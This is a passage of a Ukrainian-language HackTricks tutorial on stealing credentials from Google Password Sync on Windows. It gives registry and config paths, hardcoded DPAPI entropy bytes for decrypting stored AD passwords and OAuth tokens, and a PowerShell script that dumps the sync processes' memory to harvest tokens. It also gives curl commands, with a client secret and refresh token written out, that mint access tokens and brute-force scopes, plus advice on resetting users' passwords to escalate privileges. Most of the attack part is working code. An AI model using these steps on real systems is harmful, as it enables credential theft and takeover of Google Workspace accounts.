–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) –∑–¥–∞—Ç–Ω–∏–π –≤–∏—è–≤–ª—è—Ç–∏ **GPS**, –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é –ø—Ä–æ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—é —Ç–∞ **–Ω–∞–≤—ñ—Ç—å —Ä–æ–∑—à–∏—Ñ—Ä–æ–≤—É–≤–∞—Ç–∏ –ø–∞—Ä–æ–ª—å —ñ —Ç–æ–∫–µ–Ω**.
{% endhint %}

–£ —Ñ–∞–π–ª—ñ **`C:\ProgramData\Google\Google Apps Password Sync\config.xml`** –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —á–∞—Å—Ç–∏–Ω—É –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó, —Ç–∞–∫—É —è–∫ **`baseDN`** –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–æ–≥–æ AD —Ç–∞ **`username`**, —á–∏—ó –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è.

–£ —Ä–µ—î—Å—Ç—Ä—ñ **`HKLM\Software\Google\Google Apps Password Sync`** –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ **–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è** —Ç–∞ **–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –ø–∞—Ä–æ–ª—å** –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ AD (—è–∫—â–æ —î). –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ –∑–∞–º—ñ—Å—Ç—å —Ç–æ–∫–µ–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–µ—è–∫—ñ **–æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ SA**, —Ç–∞–∫–æ–∂ –º–æ–∂–Ω–∞ –∑–Ω–∞–π—Ç–∏ —ó—Ö –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–º–∏ –∑–∞ —Ü—ñ—î—é –∞–¥—Ä–µ—Å–æ—é —Ä–µ—î—Å—Ç—Ä—É. **–ó–Ω–∞—á–µ–Ω–Ω—è** –≤ —Ü—å–æ–º—É —Ä–µ—î—Å—Ç—Ä—ñ –¥–æ—Å—Ç—É–ø–Ω—ñ –ª–∏—à–µ **–∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º**.

–ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π **–ø–∞—Ä–æ–ª—å** (—è–∫—â–æ —î) –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –∫–ª—é—á—ñ **`ADPassword`** —ñ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`CryptProtectData`** API. –©–æ–± —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ –π–æ–≥–æ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É—Ç–∏ —Ç–∏–º –∂–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, —â–æ –π –Ω–∞–ª–∞—à—Ç—É–≤–∞–≤ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—é –ø–∞—Ä–æ–ª—ñ–≤, —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—é **–µ–Ω—Ç—Ä–æ–ø—ñ—é** –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

–ó–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π —Ç–æ–∫–µ–Ω (—è–∫—â–æ —î) –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ –∫–ª—é—á—ñ **`AuthToken`** —ñ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–π –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **`CryptProtectData`** API. –©–æ–± —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞—Ç–∏ –π–æ–≥–æ, –≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω–æ –±—É—Ç–∏ —Ç–∏–º –∂–µ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º, —â–æ –π –Ω–∞–ª–∞—à—Ç—É–≤–∞–≤ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—é –ø–∞—Ä–æ–ª—ñ–≤, —ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü—é **–µ–Ω—Ç—Ä–æ–ø—ñ—é** –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è **`CryptUnprotectData`**: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –≤—ñ–Ω —Ç–∞–∫–æ–∂ –∫–æ–¥—É—î—Ç—å—Å—è –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é base32hex –∑ —Å–ª–æ–≤–Ω–∏–∫–æ–º **`0123456789abcdefghijklmnopqrstv`**.

–ó–Ω–∞—á–µ–Ω–Ω—è –µ–Ω—Ç—Ä–æ–ø—ñ—ó –±—É–ª–∏ –∑–Ω–∞–π–¥–µ–Ω—ñ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—É. –í—ñ–Ω –±—É–≤ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –¥–ª—è –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É –≤–∏–∫–ª–∏–∫—ñ–≤ –¥–æ **`CryptUnprotectData`** —Ç–∞ **`CryptProtectData`**, –∞ –ø–æ—Ç—ñ–º —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤—Å—è –¥–ª—è –∑–∞–ø—É—Å–∫—É —Ç–∞ –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É `PasswordSync.exe`, —è–∫–∏–π —Ä–æ–∑—à–∏—Ñ—Ä—É—î –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∏–π –ø–∞—Ä–æ–ª—å —ñ —Ç–æ–∫–µ–Ω –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü—ñ—ó –Ω–∞ –ø–æ—á–∞—Ç–∫—É, —ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç **–ø–æ–∫–∞–∑—É–≤–∞—Ç–∏–º–µ –∑–Ω–∞—á–µ–Ω–Ω—è –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–æ—ó –µ–Ω—Ç—Ä–æ–ø—ñ—ó** –≤ –æ–±–æ—Ö –≤–∏–ø–∞–¥–∫–∞—Ö:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ç–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ –ø–æ–±–∞—á–∏—Ç–∏ **—Ä–æ–∑—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ** –∑–Ω–∞—á–µ–Ω–Ω—è –Ω–∞ –≤—Ö–æ–¥—ñ –∞–±–æ –≤–∏—Ö–æ–¥—ñ –≤–∏–∫–ª–∏–∫—ñ–≤ –¥–æ —Ü–∏—Ö API (–≤ —Ä–∞–∑—ñ, —è–∫—â–æ –≤ —è–∫–∏–π—Å—å –º–æ–º–µ–Ω—Ç Winpeas –ø–µ—Ä–µ—Å—Ç–∞–Ω–µ –ø—Ä–∞—Ü—é–≤–∞—Ç–∏).

–£ —Ä–∞–∑—ñ, —è–∫—â–æ —Å–∏–Ω—Ö—Ä–æ–Ω—ñ–∑–∞—Ü—ñ—è –ø–∞—Ä–æ–ª—ñ–≤ –±—É–ª–∞ **–Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω–∞ –∑ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –¥–∞–Ω–∏–º–∏ SA**, –≤–æ–Ω–∞ —Ç–∞–∫–æ–∂ –±—É–¥–µ –∑–±–µ—Ä—ñ–≥–∞—Ç–∏—Å—è –≤ –∫–ª—é—á–∞—Ö —É —Ä–µ—î—Å—Ç—Ä—ñ **`HKLM\Software\Google\Google Apps Password Sync`**.

### GPS - –í–∏—Ç—è–≥ —Ç–æ–∫–µ–Ω—ñ–≤ –∑ –ø–∞–º'—è—Ç—ñ

–¢–∞–∫ —Å–∞–º–æ, —è–∫ —ñ –∑ GCPW, –º–æ–∂–ª–∏–≤–æ –≤–∏—Ç—è–≥—Ç–∏ –ø–∞–º'—è—Ç—å –ø—Ä–æ—Ü–µ—Å—É `PasswordSync.exe` —Ç–∞ `password_sync_service.exe`, —ñ –≤–∏ –∑–º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è —Ç–∞ –¥–æ—Å—Ç—É–ø—É (—è–∫—â–æ –≤–æ–Ω–∏ –≤–∂–µ –±—É–ª–∏ –∑–≥–µ–Ω–µ—Ä–æ–≤–∞–Ω—ñ).\
–Ø –¥—É–º–∞—é, –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–≥–ª–∏ –± –∑–Ω–∞–π—Ç–∏ –Ω–∞–ª–∞—à—Ç–æ–≤–∞–Ω—ñ –æ–±–ª—ñ–∫–æ–≤—ñ –¥–∞–Ω—ñ AD.

<details>

<summary>–í–∏—Ç—è–≥–Ω—ñ—Ç—å <code>PasswordSync.exe</code> —Ç–∞ <code>password_sync_service.exe</code> –ø—Ä–æ—Ü–µ—Å–∏ —Ç–∞ —à—É–∫–∞–π—Ç–µ —Ç–æ–∫–µ–Ω–∏</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - –ì–µ–Ω–µ—Ä–∞—Ü—ñ—è —Ç–æ–∫–µ–Ω—ñ–≤ –¥–æ—Å—Ç—É–ø—É –∑ —Ç–æ–∫–µ–Ω—ñ–≤ –æ–Ω–æ–≤–ª–µ–Ω–Ω—è

–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ —Ç–æ–∫–µ–Ω –æ–Ω–æ–≤–ª–µ–Ω–Ω—è, –º–æ–∂–ª–∏–≤–æ –∑–≥–µ–Ω–µ—Ä—É–≤–∞—Ç–∏ —Ç–æ–∫–µ–Ω–∏ –¥–æ—Å—Ç—É–ø—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –π–æ–≥–æ —Ç–∞ —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä –∫–ª—ñ—î–Ω—Ç–∞ —ñ —Å–µ–∫—Ä–µ—Ç –∫–ª—ñ—î–Ω—Ç–∞, –≤–∫–∞–∑–∞–Ω—ñ –≤ –Ω–∞—Å—Ç—É–ø–Ω—ñ–π –∫–æ–º–∞–Ω–¥—ñ:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –Ω–∞–≤—ñ—Ç—å –º–∞—é—á–∏ refresh token, –Ω–µ–º–æ–∂–ª–∏–≤–æ –∑–∞–ø–∏—Ç–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π scope –¥–ª—è access token, –æ—Å–∫—ñ–ª—å–∫–∏ –≤–∏ –º–æ–∂–µ—Ç–µ –∑–∞–ø–∏—Ç—É–≤–∞—Ç–∏ –ª–∏—à–µ **scopes, –ø—ñ–¥—Ç—Ä–∏–º—É–≤–∞–Ω—ñ –¥–æ–¥–∞—Ç–∫–æ–º, –≤ —è–∫–æ–º—É –≤–∏ –≥–µ–Ω–µ—Ä—É—î—Ç–µ access token**.

–¢–∞–∫–æ–∂ refresh token –Ω–µ —î –¥—ñ–π—Å–Ω–∏–º —É –∫–æ–∂–Ω–æ–º—É –¥–æ–¥–∞—Ç–∫—É.
{% endhint %}

–ó–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º GPS –Ω–µ –º–∞—Ç–∏–º–µ –¥–æ—Å—Ç—É–ø—É —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á –¥–æ –∫–æ–∂–Ω–æ–≥–æ –º–æ–∂–ª–∏–≤–æ–≥–æ OAuth scope, —Ç–æ–º—É, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –Ω–∞—Å—Ç—É–ø–Ω–∏–π —Å–∫—Ä–∏–ø—Ç, –º–∏ –º–æ–∂–µ–º–æ –∑–Ω–∞–π—Ç–∏ scopes, —è–∫—ñ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∑ `refresh_token` –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó `access_token`:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

–Ü –æ—Å—å –≤–∏—Ö—ñ–¥, —è–∫–∏–π —è –æ—Ç—Ä–∏–º–∞–≤ –Ω–∞ –º–æ–º–µ–Ω—Ç –Ω–∞–ø–∏—Å–∞–Ω–Ω—è:
```
https://www.googleapis.com/auth/admin.directory.user
```
–Ø–∫–∏–π —î —Ç–∏–º —Å–∞–º–∏–º, —â–æ –≤–∏ –æ—Ç—Ä–∏–º—É—î—Ç–µ, —è–∫—â–æ –Ω–µ –≤–∫–∞–∑–∞—Ç–∏ –∂–æ–¥–Ω–æ—ó –æ–±–ª–∞—Å—Ç—ñ.

{% hint style="danger" %}
–ó —Ü—ñ—î—é –æ–±–ª–∞—Å—Ç—é –≤–∏ –º–æ–≥–ª–∏ –± **–∑–º—ñ–Ω–∏—Ç–∏ –ø–∞—Ä–æ–ª—å —ñ—Å–Ω—É—é—á–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ –¥–ª—è –µ—Å–∫–∞–ª–∞—Ü—ñ—ó –ø—Ä–∏–≤—ñ–ª–µ—ó–≤**.
{% endhint %}

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
–í–∏–≤—á–∞–π—Ç–µ —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞—Ç–∏ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
